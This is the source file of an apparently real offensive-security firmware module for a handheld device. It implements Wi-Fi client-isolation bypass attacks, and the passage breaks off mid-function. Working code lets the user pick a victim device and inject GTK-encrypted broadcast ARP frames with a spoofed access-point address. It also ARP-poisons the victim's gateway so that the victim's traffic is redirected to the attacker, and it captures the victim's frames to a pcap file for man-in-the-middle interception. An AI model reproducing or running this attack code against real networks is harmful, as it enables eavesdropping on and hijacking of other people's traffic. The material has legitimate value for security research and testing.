// T-REX — offensive security firmware for LilyGo T-DECK
// SPDX-License-Identifier: AGPL-3.0-or-later
// Copyright (C) 2026 Abdallah Natsheh
//
// isoscan / is — ACTIVE client-isolation bypass attacks (AirSnitch Stage 2).
// See isoscan.h for the design; this file currently implements the VICTIM
// TARGETING layer (pick from the netspy list, confirm-before-fire, attack
// menu). The individual attack cores (GTK inject, port steal, RA DNS poison)
// are Stage-2 HW-gated work and are stubbed until each is built + verified.
//
// Technique reference (NO code used — reimplemented from published research):
//   AirSnitch, Mathy Vanhoef et al., NDSS 2026.
//   https://github.com/vanhoefm/airsnitch  (all-rights-reserved → techniques only)

#include "isoscan.h"
#include <Arduino.h>
#include <WiFi.h>
#include <string.h>
#include <strings.h>               // strcasecmp
#include <ctype.h>                 // isdigit
#include <stdlib.h>                // atoi, strtok
#include "esp_wifi.h"
#include "display_manager.h"
#include "input_handling.h"
#include "lockscreen_manager.h"
#include "netspy.h"                 // victim list: count / ip / mac / name; live GTK
#include "iso_ccmp.h"              // software CCMP encrypt + self-test
#include <lwip/etharp.h>           // read the victim's reply straight from our ARP cache
#include <lwip/netif.h>
#include <lwip/tcpip.h>            // LOCK_TCPIP_CORE
#include <ESP32Ping.h>            // bounce: reach the victim via the gateway at IP layer
#include <SD.h>
#include "sdcard_manager.h"       // portdown capture → /apps/isoscan/NNN.pcap
#include "pcap_writer.h"          // libpcap writer (linktype 105)
#include "wifi_sd_guard.h"        // ScopedPromiscPause — GDMA-safe SD writes
#include <WiFiUdp.h>              // RA DNS poison: UDP-53 DNS-query listener
#include <esp_netif.h>           // RA DNS poison: our link-local IPv6 for RDNSS

extern DisplayManager displayManager;
extern InputHandling  inputHandler;
extern SDCardManager  sdCardManager;

// ── attacks ────────────────────────────────────────────────────────────────────
enum IsoAttack {
    ISO_NONE = 0,
    ISO_INJECT,     // BUILT: GTK-encrypt a broadcast ARP → reachability probe
    ISO_BOUNCE,     // BUILT: reach the victim at IP layer via the gateway
    ISO_BCAST,      // note: not separately injectable (needs our PTK)
    ISO_PORTDOWN,   // BUILT: capture victim frames → SD pcap (non-disruptive)
    ISO_PORTUP,     // BUILT: gateway ARP-poison → redirect victim's uplink to us
    ISO_MITM,       // BUILT: combined gateway poison + victim capture (L2 MITM)
    ISO_RADNS,      // BUILT: ICMPv6 RA DNS poison + UDP-53 query logger
    ISO_AUTO        // BUILT: smart probe → detect L2/L3 → recommend attack
};

struct IsoAttackInfo { IsoAttack id; const char* key; const char* label; const char* desc; };
// Ordered easiest/most-reliable first. 'auto' is the recommended front door: it
// probes and tells you which attack fits this network. [exp] = works only on some
// networks (needs L2 client isolation / does not hold against a modern gateway).
static const IsoAttackInfo ISO_ATTACKS[] = {
    { ISO_AUTO,     "auto",     "Auto: probe + recommend", "Probe the target, detect L2/L3, recommend an attack" },
    { ISO_INJECT,   "inject",   "Inject GTK broadcast",    "GTK-encrypt broadcast ARP -> reach victim (proven)" },
    { ISO_BOUNCE,   "bounce",   "Reachability probe",      "Is the victim up? ARP-based, works vs firewall" },
    { ISO_PORTDOWN, "portdown", "Capture victim -> SD",    "Log the victim's frames to an /apps/isoscan pcap" },
    { ISO_MITM,     "mitm",     "MITM: poison + capture",  "ARP poison + capture; sustained-rate verdict [exp]" },
    { ISO_PORTUP,   "portup",   "Gateway poison [exp]",    "ARP-poison the victim's gateway toward us [exp]" },
    { ISO_RADNS,    "dns",      "RA DNS poison [exp]",     "ICMPv6 RA -> point victim DNS at us, log queries" },
    { ISO_BCAST,    "bcast",    "Broadcast (note only)",   "Not separately injectable - see inject/bounce" },
};
static const int ISO_ATTACK_N = (int)(sizeof(ISO_ATTACKS) / sizeof(ISO_ATTACKS[0]));

static IsoAttack isoAttackFromKey(const char* s) {
    for (int i = 0; i < ISO_ATTACK_N; i++)
        if (!strcasecmp(s, ISO_ATTACKS[i].key)) return ISO_ATTACKS[i].id;
    return ISO_NONE;
}
static const IsoAttackInfo* isoAttackInfo(IsoAttack a) {
    for (int i = 0; i < ISO_ATTACK_N; i++) if (ISO_ATTACKS[i].id == a) return &ISO_ATTACKS[i];
    return nullptr;
}

// ── header (RED accent — this command TRANSMITS) ────────────────────────────────
static void isoHeader(const char* tag) {
    auto& dm = displayManager;
    dm.clearScreen(); dm.updateStatusBar(); dm.setDefaultTextSize();
    dm.setCursor(6, outputY);
    dm.setTextColor(0x7BEF);     dm.printText("[");
    dm.setTextColor(TFT_RED);    dm.printText("ISO");
    dm.setTextColor(0x7BEF);     dm.printText("::");
    dm.setTextColor(TFT_YELLOW); dm.printText("SCAN");
    dm.setTextColor(0x7BEF);     dm.printText("]  "); dm.println(tag);
    dm.printSeparator();
}

static void isoIpStr(uint32_t ip, char* b, int n) {
    snprintf(b, n, "%u.%u.%u.%u", (unsigned)((ip >> 24) & 0xff), (unsigned)((ip >> 16) & 0xff),
             (unsigned)((ip >> 8) & 0xff), (unsigned)(ip & 0xff));
}
static void isoMacStr(const uint8_t* m, char* b, int n) {
    snprintf(b, n, "%02x:%02x:%02x:%02x:%02x:%02x", m[0], m[1], m[2], m[3], m[4], m[5]);
}

// ── victim picker (over the netspy device list) ─────────────────────────────────
#define ISO_ROWS 9
static void isoPickDraw(int page, int sel) {
    auto& dm = displayManager;
    isoHeader("pick a victim");
    int devN = netspyDeviceCount();
    dm.setTextColor(0x7BEF);
    dm.setCursor(4,   outputY + LINE_HEIGHT * 2); dm.printText("#");
    dm.setCursor(26,  outputY + LINE_HEIGHT * 2); dm.printText("IP");
    dm.setCursor(122, outputY + LINE_HEIGHT * 2); dm.printText("NAME / VENDOR");
    int total = (devN + ISO_ROWS - 1) / ISO_ROWS; if (total < 1) total = 1;
    if (page >= total) page = total - 1;
    for (int r = 0; r < ISO_ROWS; r++) {
        int idx = page * ISO_ROWS + r;
        int y = outputY + LINE_HEIGHT * (3 + r);
        if (idx >= devN) continue;
        bool s = (r == sel);
        if (s) dm.fillRect(0, y, SCREEN_WIDTH, LINE_HEIGHT, 0x0010);
        char nb[4]; snprintf(nb, sizeof(nb), "%d", idx);
        dm.setCursor(4, y); dm.setTextColor(s ? TFT_YELLOW : TFT_DARKGREY); dm.printText(nb);
        char ipb[16]; isoIpStr(netspyDeviceIp(idx), ipb, sizeof(ipb));
        dm.setCursor(26, y); dm.setTextColor(s ? TFT_YELLOW : TFT_WHITE); dm.printText(ipb);
        const char* who = netspyDeviceName(idx); if (!who) who = "?";
        char wb[20]; snprintf(wb, sizeof(wb), "%.18s", who);
        dm.setCursor(122, y); dm.setTextColor(s ? TFT_YELLOW : TFT_CYAN); dm.printText(wb);
    }
    char foot[64];
    snprintf(foot, sizeof(foot), "dev:%d pg%d/%d  trkbl=sel ent=pick a/l=page q", devN, page + 1, total);
    dm.setTextColor(TFT_DARKGREY); dm.setCursor(6, 230); dm.printText(foot);
}

// Returns a netspy device index, or -1 if cancelled.
static int isoPickVictim() {
    auto& dm = displayManager;
    int page = 0, sel = 0; uint32_t lastDraw = 0;
    while (true) {
        char k = inputHandler.getKeyboardInput();
        TrackballEvent tb = inputHandler.getTrackballEvent();
        int devN = netspyDeviceCount();
        int pageCount = devN - page * ISO_ROWS; if (pageCount > ISO_ROWS) pageCount = ISO_ROWS;

        if (k == 'q' || k == 'Q') return -1;
        else if (k == 'l' || k == 'L') { page++; sel = 0; lastDraw = 0; }
        else if (k == 'a' || k == 'A') { if (page > 0) { page--; sel = 0; } lastDraw = 0; }
        else if ((k == '\r' || k == '\n') && pageCount > 0) return page * ISO_ROWS + sel;
        else if (tb == TBALL_CLICK && pageCount > 0)        return page * ISO_ROWS + sel;
        else if (tb == TBALL_DOWN) { if (sel < pageCount - 1) { sel++; lastDraw = 0; } }
        else if (tb == TBALL_UP)   { if (sel > 0)             { sel--; lastDraw = 0; } }

        if (LockScreenManager::getInstance().consumeJustUnlocked()) lastDraw = 0;
        if (!dm.isBlocked() && millis() - lastDraw >= 500) { isoPickDraw(page, sel); lastDraw = millis(); }
        vTaskDelay(pdMS_TO_TICKS(30));
    }
}

// ── attack menu (when no attack was given on the CLI) ────────────────────────────
static void isoMenuDraw(int idx, int sel) {
    auto& dm = displayManager;
    isoHeader("choose attack");
    dm.setTextColor(TFT_DARKGREY); dm.setCursor(6, outputY + LINE_HEIGHT * 2); dm.printText("target:");
    const char* nm = netspyDeviceName(idx); if (!nm) nm = "?";
    dm.setTextColor(TFT_CYAN); dm.setCursor(58, outputY + LINE_HEIGHT * 2); dm.printText(nm);
    for (int i = 0; i < ISO_ATTACK_N; i++) {
        int y = outputY + LINE_HEIGHT * (4 + i);
        bool s = (i == sel);
        if (s) dm.fillRect(0, y, SCREEN_WIDTH, LINE_HEIGHT, 0x0010);
        dm.setCursor(10, y); dm.setTextColor(s ? TFT_YELLOW : TFT_WHITE);
        dm.printText(ISO_ATTACKS[i].label);
    }
    dm.setTextColor(TFT_DARKGREY); dm.setCursor(6, 230);
    dm.printText("trkbl=sel  ent=run  q=cancel");
}

// Returns the chosen attack, or ISO_NONE if cancelled.
static IsoAttack isoAttackMenu(int idx) {
    auto& dm = displayManager;
    int sel = 0; uint32_t lastDraw = 0;
    while (true) {
        char k = inputHandler.getKeyboardInput();
        TrackballEvent tb = inputHandler.getTrackballEvent();
        if (k == 'q' || k == 'Q') return ISO_NONE;
        else if ((k == '\r' || k == '\n') || tb == TBALL_CLICK) return ISO_ATTACKS[sel].id;
        else if (tb == TBALL_DOWN) { if (sel < ISO_ATTACK_N - 1) { sel++; lastDraw = 0; } }
        else if (tb == TBALL_UP)   { if (sel > 0)                { sel--; lastDraw = 0; } }
        if (LockScreenManager::getInstance().consumeJustUnlocked()) lastDraw = 0;
        if (!dm.isBlocked() && millis() - lastDraw >= 500) { isoMenuDraw(idx, sel); lastDraw = millis(); }
        vTaskDelay(pdMS_TO_TICKS(30));
    }
}

// ── confirm-before-fire ─────────────────────────────────────────────────────────
// isoscan TRANSMITS at the victim, so echo exactly who is about to be hit and
// require an explicit 'y'. A fat-fingered index must not attack the wrong device.
static bool isoConfirm(int idx, IsoAttack attack) {
    auto& dm = displayManager;
    uint8_t mac[6]; bool ok = netspyDeviceMac(idx, mac);
    const IsoAttackInfo* ai = isoAttackInfo(attack);
    auto draw = [&]() {
        if (dm.isBlocked()) return;
        isoHeader("CONFIRM ATTACK");
        int y = outputY + LINE_HEIGHT * 2;
        char b[48];
        dm.setTextColor(TFT_DARKGREY); dm.setCursor(6, y);  dm.printText("attack");
        dm.setTextColor(TFT_YELLOW);   dm.setCursor(72, y); dm.printText(ai ? ai->label : "?");
        y += LINE_HEIGHT;
        dm.setTextColor(0x7BEF); dm.setCursor(72, y); dm.printText(ai ? ai->desc : ""); y += LINE_HEIGHT + 4;
        const char* nm = netspyDeviceName(idx); if (!nm) nm = "?";
        dm.setTextColor(TFT_DARKGREY); dm.setCursor(6, y);  dm.printText("name");
        dm.setTextColor(TFT_CYAN);     dm.setCursor(72, y); dm.printText(nm); y += LINE_HEIGHT;
        isoIpStr(netspyDeviceIp(idx), b, sizeof(b));
        dm.setTextColor(TFT_DARKGREY); dm.setCursor(6, y);  dm.printText("IP");
        dm.setTextColor(TFT_WHITE);    dm.setCursor(72, y); dm.printText(b); y += LINE_HEIGHT;
        isoMacStr(mac, b, sizeof(b));
        dm.setTextColor(TFT_DARKGREY); dm.setCursor(6, y);  dm.printText("MAC");
        dm.setTextColor(TFT_WHITE);    dm.setCursor(72, y); dm.printText(b); y += LINE_HEIGHT + 6;
        dm.setTextColor(TFT_RED);      dm.setCursor(6, y);
        dm.printText("This TRANSMITS at the target.");
        dm.setTextColor(TFT_DARKGREY); dm.setCursor(6, 230);
        dm.printText("[y] fire   [n]/[q] cancel");
    };
    if (!ok) return false;
    draw();
    while (true) {
        char k = inputHandler.getKeyboardInput();
        if (k == 'y' || k == 'Y') return true;
        if (k == 'n' || k == 'N' || k == 'q' || k == 'Q') return false;
        if (LockScreenManager::getInstance().consumeJustUnlocked()) draw();
        vTaskDelay(pdMS_TO_TICKS(30));
    }
}

// ── inject transmit primitive (shared by all GTK-inject payloads) ───────────────
// Build a broadcast FromDS data header: Data + FromDS + Protected; A1 = broadcast,
// A2 = BSSID (spoof the AP), A3 = source. seq goes in SeqCtrl (masked out of AAD).
static void isoBuildHdr(const uint8_t bssid[6], const uint8_t src[6], uint16_t seq, uint8_t hdr[24]) {
    hdr[0] = 0x08; hdr[1] = 0x42;                    // Data, FromDS, Protected
    hdr[2] = 0x00; hdr[3] = 0x00;                    // duration
    memset(hdr + 4, 0xff, 6);                        // A1 = broadcast
    memcpy(hdr + 10, bssid, 6);                      // A2 = BSSID (spoofed)
    memcpy(hdr + 16, src, 6);                        // A3 = original source
    uint16_t sc = (uint16_t)((seq & 0x0fff) << 4);   // seq number, fragment 0
    hdr[22] = (uint8_t)(sc & 0xff); hdr[23] = (uint8_t)(sc >> 8);
}

// LLC/SNAP + ARP request ("who-has victimIp, tell srcIp/srcMac"). Returns length.
static int isoBuildArp(const uint8_t srcMac[6], uint32_t srcIp, uint32_t dstIp, uint8_t* p) {
    static const uint8_t snap[8] = { 0xAA, 0xAA, 0x03, 0x00, 0x00, 0x00, 0x08, 0x06 };
    memcpy(p, snap, 8);
    uint8_t* a = p + 8;
    a[0] = 0x00; a[1] = 0x01;                         // HW type: Ethernet
    a[2] = 0x08; a[3] = 0x00;                         // proto: IPv4
    a[4] = 0x06; a[5] = 0x04;                         // hlen 6, plen 4
    a[6] = 0x00; a[7] = 0x01;                         // opcode: request
    memcpy(a + 8, srcMac, 6);                         // sender MAC
    a[14] = (srcIp >> 24) & 0xff; a[15] = (srcIp >> 16) & 0xff;
    a[16] = (srcIp >> 8) & 0xff;  a[17] = srcIp & 0xff;
    memset(a + 18, 0x00, 6);                          // target MAC unknown
    a[24] = (dstIp >> 24) & 0xff; a[25] = (dstIp >> 16) & 0xff;
    a[26] = (dstIp >> 8) & 0xff;  a[27] = dstIp & 0xff;
    return 8 + 28;
}

// One GTK-encrypted broadcast ARP on the air. Shared by every inject payload
// (reachability inject, gateway poison, combined MITM) — the encrypt+assemble+TX
// dance is identical; only the sender IP (our IP vs the gateway IP we impersonate)
// changes. Returns the esp_wifi_80211_tx result (ESP_OK on success).
static esp_err_t isoTxGtkArp(const uint8_t gtk[16], const uint8_t bssid[6], const uint8_t src[6],
                             uint8_t keyid, uint64_t pn, uint16_t seq,
                             uint32_t senderIp, uint32_t targetIp) {
    uint8_t pnb[6]; for (int i = 0; i < 6; i++) pnb[i] = (uint8_t)((pn >> (8 * i)) & 0xff);
    uint8_t hdr[24]; isoBuildHdr(bssid, src, seq, hdr);
    uint8_t plain[64]; int plen = isoBuildArp(src, senderIp, targetIp, plain);
    uint8_t enc[96];
    int elen = isoCcmpEncrypt(gtk, 16, hdr, keyid, pnb, plain, plen, enc, sizeof(enc));
    if (elen <= 0) return ESP_FAIL;
    uint8_t frame[128]; memcpy(frame, hdr, 24); memcpy(frame + 24, enc, elen);
    return esp_wifi_80211_tx(WIFI_IF_STA, frame, 24 + elen, false);
}

// Note: no promiscuous RX here. The victim's ARP reply is UNICAST to us, so it
// flows through the normal STA data path into lwip (not the promiscuous cb, which
// only gets group frames decrypted). We detect it by reading our own ARP cache —
// and enabling promiscuous would risk diverting that reply away from lwip.

// First real inject: GTK-encrypted broadcast ARP at the victim (plan "inject arp",
// reachability probe). Also the diagnostic for the big unknown — will
// esp_wifi_80211_tx accept a frame whose A2 is the spoofed BSSID while we're
// associated? The live TX ok/err counters answer that on the first flash.
static void isoInjectArp(int idx) {
    auto& dm = displayManager;
    uint8_t gtk[32]; int glen = 0;
    if (!netspyGetGtk(gtk, &glen) || glen != 16) {
        isoHeader("inject");
        dm.setTextColor(TFT_RED); dm.println("GTK unreadable — abort.");
        dm.setTextColor(0x7BEF);  dm.println("(run 'is cctest' to check)");
        dm.printCommandScreen(); return;
    }
    const uint8_t* bm = WiFi.BSSID();
    if (!bm) { isoHeader("inject"); dm.setTextColor(TFT_RED); dm.println("No BSSID."); dm.printCommandScreen(); return; }
    uint8_t bssid[6]; memcpy(bssid, bm, 6);
    uint8_t src[6];   esp_wifi_get_mac(WIFI_IF_STA, src);
    IPAddress lip = WiFi.localIP();
    uint32_t myIp = ((uint32_t)lip[0] << 24) | ((uint32_t)lip[1] << 16) | ((uint32_t)lip[2] << 8) | lip[3];
    uint32_t victimIp = netspyDeviceIp(idx);

    uint64_t pn = 0x800000000000ULL;                 // start high to beat AP group PN
    uint8_t  keyid = 1;                              // GTK key id — tunable ([k] toggles 1/2)
    uint16_t seq = 0;
    uint32_t txOk = 0, txErr = 0;
    uint32_t lastTx = 0, lastDraw = 0, lastArp = 0;
    esp_err_t lastRc = ESP_OK;
    bool arpHit = false; uint8_t arpMac[6] = { 0 };  // victim reply seen in OUR ARP cache

    auto draw = [&]() {
        if (dm.isBlocked()) return;
        isoHeader("inject: ARP (GTK)");
        int y = outputY + LINE_HEIGHT * 2; char b[48];
        const char* nm = netspyDeviceName(idx); if (!nm) nm = "?";
        dm.setTextColor(TFT_DARKGREY); dm.setCursor(6, y);  dm.printText("target");
        dm.setTextColor(TFT_CYAN);     dm.setCursor(72, y); dm.printText(nm); y += LINE_HEIGHT;
        isoIpStr(victimIp, b, sizeof(b));
        dm.setTextColor(TFT_WHITE);    dm.setCursor(72, y); dm.printText(b); y += LINE_HEIGHT + 4;
        snprintf(b, sizeof(b), "keyid %u", keyid);
        dm.setTextColor(TFT_DARKGREY); dm.setCursor(6, y);  dm.printText("params");
        dm.setTextColor(TFT_YELLOW);   dm.setCursor(72, y); dm.printText(b); y += LINE_HEIGHT + 4;
        snprintf(b, sizeof(b), "TX ok : %lu", (unsigned long)txOk);
        dm.setTextColor(TFT_GREEN);    dm.setCursor(6, y); dm.printText(b); y += LINE_HEIGHT;
        snprintf(b, sizeof(b), "TX err: %lu (rc=%d)", (unsigned long)txErr, (int)lastRc);
        dm.setTextColor(txErr ? TFT_RED : TFT_DARKGREY); dm.setCursor(6, y); dm.printText(b);
        y += LINE_HEIGHT + 4;
        // victim reply = inject reached the target. The unicast reply is delivered
        // to our IP stack, so we read it straight from our own ARP cache.
        if (arpHit) {
            dm.setTextColor(TFT_GREEN); dm.setCursor(6, y);
            dm.printText("VICTIM REPLIED - reachable!"); y += LINE_HEIGHT;
            snprintf(b, sizeof(b), "%02x:%02x:%02x:%02x:%02x:%02x  (ARP cache)",
                     arpMac[0], arpMac[1], arpMac[2], arpMac[3], arpMac[4], arpMac[5]);
            dm.setTextColor(TFT_GREEN); dm.setCursor(6, y); dm.printText(b);
        } else {
            dm.setTextColor(TFT_DARKGREY); dm.setCursor(6, y);
            dm.printText("no reply yet (waiting...)");
        }
        dm.setTextColor(TFT_DARKGREY); dm.setCursor(6, 230);
        dm.printText("[k] keyid 1/2   [q] stop");
    };
    draw();

    while (true) {
        char k = inputHandler.getKeyboardInput();
        if (k == 'q' || k == 'Q') break;
        if (k == 'k' || k == 'K') { keyid = (keyid == 1) ? 2 : 1; lastDraw = 0; }

        if (millis() - lastTx >= 20) {                 // ~50 fps (enough to hold a poison on an L2 AP)
            lastTx = millis();
            lastRc = isoTxGtkArp(gtk, bssid, src, keyid, pn, seq++, myIp, victimIp);
            if (lastRc == ESP_OK) txOk++; else txErr++;
            pn++;
            lastDraw = 0;
        }

        // Resolve the victim via our own IP stack (netdiscover's proven pattern:
        // etharp_request primes a pending entry, then etharp_find_addr reads it
        // once a reply completes it). A hit = the victim is reachable at the IP
        // layer. On an ISOLATED net a normal ARP can't reach it, so a hit means
        // our injected broadcast is what got through; on a NON-isolated net the
        // stack can resolve it anyway (so it just confirms the detector works).
        if (!arpHit && netif_default && millis() - lastArp >= 500) {
            lastArp = millis();
            ip4_addr_t vt;
            IP4_ADDR(&vt, (victimIp >> 24) & 0xff, (victimIp >> 16) & 0xff,
                     (victimIp >> 8) & 0xff, victimIp & 0xff);
            struct eth_addr* er = nullptr; const ip4_addr_t* ir = nullptr;
            LOCK_TCPIP_CORE();
            etharp_request(netif_default, &vt);
            s8_t hit = etharp_find_addr(netif_default, &vt, &er, &ir);
            UNLOCK_TCPIP_CORE();
            if (hit >= 0 && er) { arpHit = true; memcpy(arpMac, er->addr, 6); lastDraw = 0; }
        }

        if (LockScreenManager::getInstance().consumeJustUnlocked()) lastDraw = 0;
        if (!dm.isBlocked() && millis() - lastDraw >= 300) { draw(); lastDraw = millis(); }
        vTaskDelay(pdMS_TO_TICKS(5));
    }
    dm.clearScreen(); dm.printCommandScreen();
}

// ── gateway ARP-poison (uplink MITM + isolation-delivery test) ───────────────────
// Inject a sustained GTK-encrypted ARP advertising the GATEWAY's IP as coming from
// our MAC ("who-has victim tell gateway<-ourMAC"): the victim caches gateway->us and
// starts sending its upstream traffic to the T-Deck. On this isolated hotspot this
// is also THE delivery test — if the victim's internet redirects/stalls, then
// victim->T-Deck delivery works and traffic-interception attacks (RA DNS poison,
// MITM) are viable; if the victim keeps browsing normally, isolation is dropping it.
static void isoGwPoison(int idx) {
    auto& dm = displayManager;
    uint8_t gtk[32]; int glen = 0;
    if (!netspyGetGtk(gtk, &glen) || glen != 16) {
        isoHeader("gw poison");
        dm.setTextColor(TFT_RED); dm.println("GTK unreadable — abort."); dm.printCommandScreen(); return;
    }
    const uint8_t* bm = WiFi.BSSID();
    if (!bm) { isoHeader("gw poison"); dm.setTextColor(TFT_RED); dm.println("No BSSID."); dm.printCommandScreen(); return; }
    uint8_t bssid[6]; memcpy(bssid, bm, 6);
    uint8_t src[6];   esp_wifi_get_mac(WIFI_IF_STA, src);
    IPAddress gw = WiFi.gatewayIP();
    uint32_t gwIp = ((uint32_t)gw[0] << 24) | ((uint32_t)gw[1] << 16) | ((uint32_t)gw[2] << 8) | gw[3];
    uint32_t victimIp = netspyDeviceIp(idx);
    if (!gwIp) { isoHeader("gw poison"); dm.setTextColor(TFT_RED); dm.println("No gateway IP."); dm.printCommandScreen(); return; }

    uint64_t pn = 0x800000000000ULL; uint8_t keyid = 1; uint16_t seq = 0;
    uint32_t txOk = 0, txErr = 0, lastTx = 0, lastDraw = 0; esp_err_t lastRc = ESP_OK;

    auto draw = [&]() {
        if (dm.isBlocked()) return;
        isoHeader("gateway poison");
        int y = outputY + LINE_HEIGHT * 2; char b[48];
        isoIpStr(gwIp, b, sizeof(b));
        dm.setTextColor(TFT_DARKGREY); dm.setCursor(6, y);  dm.printText("gateway");
        dm.setTextColor(TFT_YELLOW);   dm.setCursor(72, y); dm.printText(b); y += LINE_HEIGHT;
        isoIpStr(victimIp, b, sizeof(b));
        dm.setTextColor(TFT_DARKGREY); dm.setCursor(6, y);  dm.printText("victim");
        dm.setTextColor(TFT_CYAN);     dm.setCursor(72, y); dm.printText(b); y += LINE_HEIGHT + 4;
        snprintf(b, sizeof(b), "keyid %u   TX ok %lu", keyid, (unsigned long)txOk);
        dm.setTextColor(TFT_GREEN);    dm.setCursor(6, y); dm.printText(b); y += LINE_HEIGHT;
        snprintf(b, sizeof(b), "TX err %lu (rc=%d)", (unsigned long)txErr, (int)lastRc);
        dm.setTextColor(txErr ? TFT_RED : TFT_DARKGREY); dm.setCursor(6, y); dm.printText(b); y += LINE_HEIGHT + 4;
        dm.setTextColor(0x7BEF); dm.setCursor(6, y); dm.printText("victim gateway -> this device."); y += LINE_HEIGHT;
        dm.setTextColor(0x7BEF); dm.setCursor(6, y); dm.printText("watch its internet: drop = works.");
        dm.setTextColor(TFT_DARKGREY); dm.setCursor(6, 230); dm.printText("[k] keyid 1/2   [q] stop");
    };
    draw();
    while (true) {
        char k = inputHandler.getKeyboardInput();
        if (k == 'q' || k == 'Q') break;
        if (k == 'k' || k == 'K') { keyid = (keyid == 1) ? 2 : 1; lastDraw = 0; }
        if (millis() - lastTx >= 20) {                 // ~50 fps (enough to hold a poison on an L2 AP)
            lastTx = millis();
            lastRc = isoTxGtkArp(gtk, bssid, src, keyid, pn, seq++, gwIp, victimIp);  // sender IP = gateway
            if (lastRc == ESP_OK) txOk++; else txErr++;
            pn++;
            lastDraw = 0;
        }
        if (LockScreenManager::getInstance().consumeJustUnlocked()) lastDraw = 0;
        if (!dm.isBlocked() && millis() - lastDraw >= 300) { draw(); lastDraw = millis(); }
        vTaskDelay(pdMS_TO_TICKS(5));
    }
    dm.clearScreen(); dm.printCommandScreen();
}

// portdown capture ring — promiscuous grabs every 802.11 data frame that mentions
// the victim MAC (A1/A2/A3) into a RAM ring; the main loop drains it to an SD pcap
// with promiscuous paused (GDMA rule). Non-disruptive: no MAC change, we stay
// associated. Captures the group traffic + anything a poison redirects our way.
#define ISO_CAP_RING 16
#define ISO_CAP_MAX  288
struct IsoCapFrame { uint16_t len; uint32_t ts; uint8_t data[ISO_CAP_MAX]; };
static volatile IsoCapFrame s_capRing[ISO_CAP_RING];
static volatile uint8_t     s_capHead = 0, s_capTail = 0;
static volatile uint8_t     s_capVic[6];
static volatile uint8_t     s_capOur[6];             // our STA MAC — for redirect detection
static volatile bool        s_capActive = false;
static volatile bool        s_capRedirOn = false;    // classify redirected victim uplink (MITM proof)
static volatile uint32_t    s_capSeen = 0, s_capDropped = 0;
static volatile uint32_t    s_capRedir = 0;          // victim IP DATA relayed to us = REAL MITM
static volatile uint32_t    s_capArpAck = 0;         // victim ARP reply to our poison = reacted only
static volatile uint32_t    s_capCand = 0;           // raw addr-match (A1=us,A3=victim) before classify

static void isoCapCb(void* buf, wifi_promiscuous_pkt_type_t t) {
    if (!s_capActive || t != WIFI_PKT_DATA) return;
    wifi_promiscuous_pkt_t* pk = (wifi_promiscuous_pkt_t*)buf;
    int len = pk->rx_ctrl.sig_len;
    if (len < 24 || len > 2000) return;
    const uint8_t* f = pk->payload;
    if (memcmp(f + 4,  (const void*)s_capVic, 6) != 0 &&     // A1 dest
        memcmp(f + 10, (const void*)s_capVic, 6) != 0 &&     // A2
        memcmp(f + 16, (const void*)s_capVic, 6) != 0) return; // A3
    s_capSeen++;
    // Redirect signal: a from-DS frame the AP relayed to US (A1=our MAC) whose
    // original source is the victim (A3=victim). This matches TWO different frames
    // and only ONE is real MITM proof, so classify by ethertype:
    //   ARP (0x0806) → the victim just ACKing our poison (reacted, not redirected)
    //   IP  (0x0800/0x86dd) → the victim's actual uplink DATA arriving = REAL MITM.
    // Counting the ARP reply as "MITM live" is a false positive (seen on HW: green
    // yet the victim kept full internet). Payload is decrypted for frames addressed
    // to us; CCMP header (8B) is kept, so LLC/SNAP starts at hdrlen+8.
    if (s_capRedirOn && (f[1] & 0x03) == 0x02 &&             // from-DS only
        memcmp(f + 4,  (const void*)s_capOur, 6) == 0 &&     // A1 = us
        memcmp(f + 16, (const void*)s_capVic, 6) == 0) {     // A3 = victim
        s_capCand++;                                         // raw match (payload not yet read)
        int hl = ((f[0] & 0x8C) == 0x88) ? 26 : 24;          // QoS data → +2
        int eo = hl + 8 + 6;                                 // +CCMP(8) +SNAP(6) = ethertype
        if (eo + 1 < len) {
            uint16_t et = (uint16_t)((f[eo] << 8) | f[eo + 1]);
            if (et == 0x0806)                       s_capArpAck++;   // poison ACK only
            else if (et == 0x0800 || et == 0x86DD)  s_capRedir++;    // real data redirect
        }
    }
    uint8_t nx = (uint8_t)((s_capHead + 1) % ISO_CAP_RING);
    if (nx == s_capTail) { s_capDropped++; return; }
    int n = len > ISO_CAP_MAX ? ISO_CAP_MAX : len;
    memcpy((void*)s_capRing[s_capHead].data, f, n);
    s_capRing[s_capHead].len = (uint16_t)n;
    s_capRing[s_capHead].ts  = millis();
    s_capHead = nx;
}

// ── bounce — reachability probe (ARP first, ICMP fallback) ───────────────────────
// "Is the victim actually up and reachable from here?" ARP is the reliable test on a
// LAN: every host MUST answer ARP (handled below the OS firewall), so it works even
// against a Windows box that drops ICMP echo — which is why the old ping-only probe
// wrongly reported Windows victims as unreachable. We resolve via our own lwip ARP
// (netdiscover's pattern), then try ICMP too as extra info. On a non-isolated net
// ARP resolves directly; under strict isolation it won't (use 'inject' there).
static void isoBounce(int idx) {
    auto& dm = displayManager;
    isoHeader("reachability probe");
    uint32_t victimIp = netspyDeviceIp(idx);
    if (!victimIp)     { dm.setTextColor(TFT_RED); dm.println("Victim has no IP."); dm.printCommandScreen(); return; }
    if (!netif_default){ dm.setTextColor(TFT_RED); dm.println("No network interface."); dm.printCommandScreen(); return; }

    char b[56]; isoIpStr(victimIp, b, sizeof(b));
    dm.setTextColor(0x7BEF); dm.printText("Checking "); dm.printText(b); dm.println(" ...");
    dm.println("");

    // 1) ARP resolve (works vs Windows firewall).
    ip4_addr_t vt; IP4_ADDR(&vt, (victimIp >> 24) & 0xff, (victimIp >> 16) & 0xff,
                            (victimIp >> 8) & 0xff, victimIp & 0xff);
    uint8_t mac[6]; bool arpOk = false;
    for (int t = 0; t < 24 && !arpOk; t++) {          // ~6s
        struct eth_addr* er = nullptr; const ip4_addr_t* ir = nullptr;
        LOCK_TCPIP_CORE();
        etharp_request(netif_default, &vt);
        s8_t hit = etharp_find_addr(netif_default, &vt, &er, &ir);
        UNLOCK_TCPIP_CORE();
        if (hit >= 0 && er) { memcpy(mac, er->addr, 6); arpOk = true; break; }
        if (inputHandler.getKeyboardInput() == 'q') break;
        vTaskDelay(pdMS_TO_TICKS(250));
    }

    // 2) ICMP as a secondary datapoint (Windows usually drops it — not decisive).
    IPAddress vAddr((uint8_t)((victimIp >> 24) & 0xff), (uint8_t)((victimIp >> 16) & 0xff),
                    (uint8_t)((victimIp >> 8) & 0xff), (uint8_t)(victimIp & 0xff));
    bool icmpOk = Ping.ping(vAddr, 3);
    float ms = icmpOk ? Ping.averageTime() : 0.0f;

    // Report. Reachable if EITHER works; ARP is the authoritative "host is up".
    if (arpOk) {
        dm.setTextColor(TFT_GREEN); dm.println("REACHABLE (ARP)");
